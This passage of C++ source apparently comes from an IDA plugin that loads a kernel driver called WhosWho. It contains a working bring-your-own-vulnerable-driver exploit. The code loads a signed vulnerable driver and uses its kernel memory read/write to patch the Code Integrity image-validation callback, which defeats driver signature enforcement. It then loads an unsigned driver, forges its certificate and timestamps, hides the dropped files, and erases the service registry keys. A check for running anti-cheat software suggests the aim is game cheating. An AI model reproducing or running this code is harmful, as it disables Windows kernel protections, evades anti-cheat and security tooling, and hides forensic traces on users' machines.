    HANDLE hw = CreateFileW(targetPath, GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS,
        FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_TEMPORARY, nullptr);
    if (hw == INVALID_HANDLE_VALUE) { VirtualFree(final2, 0, MEM_RELEASE); return FALSE; }
    DWORD wrt = 0;
    BOOL wok = WriteFile(hw, final2, finalSz, &wrt, nullptr);
    FlushFileBuffers(hw);
    if (donorC.dwHighDateTime || donorC.dwLowDateTime) SetFileTime(hw, &donorC, &donorA, &donorW);
    CloseHandle(hw);
    VirtualFree(final2, 0, MEM_RELEASE);
    if (!wok || wrt != finalSz) return FALSE;
    return TRUE;
}


static NTSTATUS TriggerExploit(PCWSTR targetDriverFileName)
{
    HANDLE deviceHandle = nullptr;
    NTSTATUS status = VulnOpenDevice(&deviceHandle);
    if (!NT_SUCCESS(status)) {
        status = LoadDriverSvc(s_LoaderServicePath);
        if (!NT_SUCCESS(status) && status != STATUS_OBJECT_NAME_COLLISION &&
            status != STATUS_IMAGE_ALREADY_LOADED) {
            return status;
        }
        for (int retry = 0; retry < 10; retry++) {
            Sleep(100);
            status = VulnOpenDevice(&deviceHandle);
            if (NT_SUCCESS(status)) break;
        }
        if (!NT_SUCCESS(status)) {
            return status;
        }
    }

    PVOID ciEntry = nullptr, zwFlush = nullptr;
    if (!GetCiValidateImageHeaderEntry(&ciEntry, &zwFlush)) {
        VulnCloseDevice(deviceHandle); return STATUS_UNSUCCESSFUL;
    }
    if (!ciEntry || !zwFlush) { VulnCloseDevice(deviceHandle); return STATUS_UNSUCCESSFUL; }

    PVOID origCb = nullptr;
    status = VulnReadKernelMemory(deviceHandle, ciEntry, &origCb, sizeof(PVOID));
    if (!NT_SUCCESS(status)) { VulnCloseDevice(deviceHandle); return status; }
    s_OriginalCiCallback = origCb;
    s_CiCallbackAddress  = ciEntry;

    status = VulnWriteKernelMemory(deviceHandle, ciEntry, &zwFlush, sizeof(PVOID));
    if (!NT_SUCCESS(status)) {
        VulnCloseDevice(deviceHandle); return status;
    }
    s_CiCallbackPatched = true;

    status = LoadDriverSvc(s_DriverServicePath);

    if (NT_SUCCESS(status)) {
        PatchDriverSigningFlags(deviceHandle, targetDriverFileName);
    }


    NTSTATUS restSt = VulnWriteKernelMemory(deviceHandle, ciEntry, &origCb, sizeof(PVOID));
    if (NT_SUCCESS(restSt)) {
        s_CiCallbackPatched = false;
        PVOID verify = nullptr;
        VulnReadKernelMemory(deviceHandle, ciEntry, &verify, sizeof(PVOID));
        if (verify != origCb)
            VulnWriteKernelMemory(deviceHandle, ciEntry, &origCb, sizeof(PVOID));
    }

    UnloadDriverSvc(s_LoaderServicePath);
    VulnCloseDevice(deviceHandle);
    return status;
}

static NTSTATUS WindLoadDriver(PCWSTR loaderPath, PCWSTR driverPath)
{
    NTSTATUS status = AdjustPrivilege(DL_SE_LOAD_DRIVER_PRIVILEGE, TRUE);
    if (!NT_SUCCESS(status)) {
        dl_msg("AiDA Driver: Failed to adjust privilege: 0x%08X (run IDA as admin)\n", status);
        return status;
    }

    WCHAR loaderFull[4096] = {}, driverFull[4096] = {};
    status = GetFullPath(loaderPath, loaderFull, _countof(loaderFull));
    if (!NT_SUCCESS(status)) {
        dl_msg("AiDA Driver: Failed to resolve loader path: 0x%08X\n", status);
        return status;
    }
    status = GetFullPath(driverPath, driverFull, _countof(driverFull));
    if (!NT_SUCCESS(status)) {
        dl_msg("AiDA Driver: Failed to resolve target driver path: 0x%08X\n", status);
        return status;
    }

    status = CreateDriverService(s_DriverServicePath, driverFull);
    if (!NT_SUCCESS(status)) {
        dl_msg("AiDA Driver: Failed to create target driver service: 0x%08X\n", status);
        return status;
    }
    status = CreateDriverService(s_LoaderServicePath, loaderFull);
    if (!NT_SUCCESS(status)) {
        dl_msg("AiDA Driver: Failed to create loader service: 0x%08X\n", status);
        return status;
    }

    TransplantCertificate(driverFull);

    PCWSTR targetFN = wcsrchr(driverFull, L'\\');
    targetFN = targetFN ? targetFN + 1 : driverFull;

    status = TriggerExploit(targetFN);
    if (!NT_SUCCESS(status))
        dl_msg("AiDA Driver: TriggerExploit failed: 0x%08X\n", status);
    return status;
}

static NTSTATUS CleanupArtifacts()
{
    auto deleteSvc = [](PCWSTR regPath) {
        if (!regPath || wcslen(regPath) < 10) return;
        if (s_NtDeleteKey && s_NtOpenKey) {
            UNICODE_STRING kn; RtlInitUnicodeString(&kn, regPath);
            OBJECT_ATTRIBUTES oa; InitializeObjectAttributes(&oa, &kn, OBJ_CASE_INSENSITIVE, nullptr, nullptr);
            HANDLE hk = nullptr;
            NTSTATUS st = s_NtOpenKey(&hk, DELETE | KEY_ENUMERATE_SUB_KEYS, &oa);
            if (NT_SUCCESS(st)) {
                const WCHAR* subs[] = { L"\\Enum", L"\\Security", L"\\Parameters" };
                for (int i = 0; i < 3; i++) {
                    WCHAR sp2[512]; wcscpy_s(sp2, regPath); wcscat_s(sp2, subs[i]);
                    UNICODE_STRING sn; RtlInitUnicodeString(&sn, sp2);
                    OBJECT_ATTRIBUTES sa; InitializeObjectAttributes(&sa, &sn, OBJ_CASE_INSENSITIVE, nullptr, nullptr);
                    HANDLE hsk = nullptr;
                    if (NT_SUCCESS(s_NtOpenKey(&hsk, DELETE, &sa))) { s_NtDeleteKey(hsk); NtClose(hsk); }
                }
                if (s_NtFlushKey) s_NtFlushKey(hk);
                s_NtDeleteKey(hk); NtClose(hk);
                return;
            }
        }
        WCHAR rp[256];
        if (wcslen(regPath) > 18) { wcscpy_s(rp, regPath + 18); SHDeleteKeyW(HKEY_LOCAL_MACHINE, rp); }
    };

    if (wcslen(s_LoaderServicePath) > 0)  deleteSvc(s_LoaderServicePath);
    if (wcslen(s_DriverServicePath) > 0)  deleteSvc(s_DriverServicePath);
    return STATUS_SUCCESS;
}


static bool IsWhosWhoDeviceReachable()
{
    std::wstring path = voyager::device_names_um::get_device_path();
    HANDLE h = CreateFileW(path.c_str(), GENERIC_READ,
        FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr,
        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (h == INVALID_HANDLE_VALUE) return false;
    CloseHandle(h);
    return true;
}

}


bool driver_loader::is_driver_loaded()
{
    return s_DriverLoadedSuccessfully || IsWhosWhoDeviceReachable();
}

bool driver_loader::initialize_and_load()
{
    if (IsWhosWhoDeviceReachable()) {
        dl_msg("AiDA Driver: WhosWho driver is already loaded.\n");
        s_DriverLoadedSuccessfully = true;
        return true;
    }


    {
        BOOL isAdmin = FALSE;
        PSID adminGroup = nullptr;
        SID_IDENTIFIER_AUTHORITY ntAuth = SECURITY_NT_AUTHORITY;
        if (AllocateAndInitializeSid(&ntAuth, 2, SECURITY_BUILTIN_DOMAIN_RID,
            DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminGroup)) {
            CheckTokenMembership(NULL, adminGroup, &isAdmin);
            FreeSid(adminGroup);
        }
        if (!isAdmin) {
            dl_msg("AiDA Driver: IDA must be run as Administrator to load the kernel driver.\n");
            return false;
        }
    }


    {
        std::wstring acDetected = DetectRunningAntiCheat();
        if (!acDetected.empty()) {
            char acNameNarrow[256] = {};
            WideCharToMultiByte(CP_UTF8, 0, acDetected.c_str(), -1,
                acNameNarrow, sizeof(acNameNarrow), NULL, NULL);
            dl_msg("AiDA Driver: Anti-cheat process/driver detected: %s\n", acNameNarrow);
            int answer = ask_yn(ASKBTN_NO,
                "AN ANTICHEAT PROCESS/DRIVER IS CURRENTLY RUNNING! (%s)\n\n"
                "ARE YOU SURE YOU WANT TO LOAD THE AiDA DRIVER?",
                acNameNarrow);
            if (answer != ASKBTN_YES) {
                dl_msg("AiDA Driver: User declined driver loading with anti-cheat present.\n");
                return false;
            }
        }
    }


    if (!InitializeNtFunctions()) {
        dl_msg("AiDA Driver: Initialization failed.\n");
        return false;
    }


    if (!DecryptP2CDriver()) {
        dl_msg("AiDA Driver: Initialization failed.\n");
        return false;
    }
    if (!DecryptWhosWhoDriver()) {
        dl_msg("AiDA Driver: Initialization failed.\n");
        ReleaseP2CDriver();
        return false;
    }


    if (!CreateRandomExtractDirectory()) {
        dl_msg("AiDA Driver: Initialization failed.\n");
        ReleaseP2CDriver(); ReleaseWhosWhoDriver();
        return false;
    }
    std::wstring loaderTempPath = GetRandomFilePath(L".sys");
    std::wstring driverTempPath = GetRandomFilePath(L".sys");
    if (loaderTempPath.empty() || driverTempPath.empty()) {
        dl_msg("AiDA Driver: Initialization failed.\n");
        ReleaseP2CDriver(); ReleaseWhosWhoDriver();
        CleanupRandomExtractDirectory();
        return false;
    }


    {
        HANDLE hf = CreateFileW(loaderTempPath.c_str(), GENERIC_WRITE, 0, nullptr,
            CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_TEMPORARY, nullptr);
        if (hf == INVALID_HANDLE_VALUE) {
            dl_msg("AiDA Driver: Initialization failed.\n");
            ReleaseP2CDriver(); ReleaseWhosWhoDriver();
            CleanupRandomExtractDirectory();
            return false;
        }
        DWORD written = 0;
        const DWORD expectedP2C = static_cast<DWORD>(s_P2CDriverSize);
        BOOL wok = WriteFile(hf, s_P2CDriverData, expectedP2C, &written, nullptr);
        DWORD werr = GetLastError();
        FlushFileBuffers(hf); CloseHandle(hf);
        ReleaseP2CDriver();
        if (!wok || written != expectedP2C) {
            dl_msg("AiDA Driver: Initialization failed.\n");
            SecureDeleteFile(loaderTempPath.c_str());
            ReleaseWhosWhoDriver();
            CleanupRandomExtractDirectory();
            return false;
        }
    }


    {
        HANDLE hf = CreateFileW(driverTempPath.c_str(), GENERIC_WRITE, 0, nullptr,
            CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_TEMPORARY, nullptr);
        if (hf == INVALID_HANDLE_VALUE) {
            dl_msg("AiDA Driver: Initialization failed.\n");
            SecureDeleteFile(loaderTempPath.c_str());
            ReleaseWhosWhoDriver();
            CleanupRandomExtractDirectory();
            return false;
        }
        DWORD written = 0;
        const DWORD expectedWW = static_cast<DWORD>(s_WhosWhoSize);
        BOOL wok = WriteFile(hf, s_WhosWhoData, expectedWW, &written, nullptr);
        DWORD werr = GetLastError();
        FlushFileBuffers(hf); CloseHandle(hf);
        ReleaseWhosWhoDriver();
        if (!wok || written != expectedWW) {
            dl_msg("AiDA Driver: Initialization failed.\n");
            SecureDeleteFile(loaderTempPath.c_str());
            SecureDeleteFile(driverTempPath.c_str());
            CleanupRandomExtractDirectory();
            return false;
        }
    }

    SetFileAttributesW(driverTempPath.c_str(),
        FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_TEMPORARY);

    NTSTATUS status = WindLoadDriver(loaderTempPath.c_str(), driverTempPath.c_str());


    ForceDeleteDriverFile(loaderTempPath.c_str());
    ForceDeleteDriverFile(driverTempPath.c_str());
    CleanupRandomExtractDirectory();

    CleanupArtifacts();

    if (NT_SUCCESS(status)) {
        dl_msg("AiDA Driver: WhosWho driver loaded successfully.\n");
        s_DriverLoadedSuccessfully = true;
        return true;
    } else {
        dl_msg("AiDA Driver: Driver initialization failed (0x%08X).\n", status);
        return false;
    }
}

#endif
